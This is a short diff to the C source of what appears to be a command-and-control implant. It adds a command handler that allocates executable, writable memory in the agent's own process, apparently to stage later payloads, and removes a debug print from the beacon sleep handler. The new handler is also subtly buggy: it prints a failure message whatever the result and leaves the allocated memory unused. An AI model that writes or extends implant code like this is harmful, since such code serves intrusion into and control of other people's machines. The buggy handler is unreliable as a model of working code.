@@ -78,6 +78,23 @@ FUNC VOID CommandDispatcher(
     Instance()->Session.Connected = FALSE;
 }
 
+FUNC VOID CommandMemory( 
+    _In_ PPARSER Parser    
+) {
+    PVOID BaseAddr = NULL;
+    DWORD AddrSize = 0x2000;
+    DWORD ErrCode  = 0;
+
+    ErrCode = bkMemAlloc( NtCurrentProcess(), &BaseAddr, AddrSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
+
+    BK_PRINT( "[I] mem allocated @ 0x%p\n", BaseAddr );
+
+    BK_PRINT( "[!] failed with err: %d\n", ErrCode );
+
+    if ( ErrCode != 0 )
+        PackageTransmitError( ErrCode );
+}
+
 FUNC VOID CommandRun(
     _In_ PPARSER Parser
 ) {
@@ -183,8 +200,6 @@ FUNC VOID CommandSleep(
     BK_PACKAGE = PackageCreate( COMMAND_SLEEP );
 
     DWORD SleepTime = ParserGetInt32( Parser );
-
-    BK_PRINT( "%d\n", SleepTime );
 
     Instance()->Session.SleepTime = SleepTime;
 
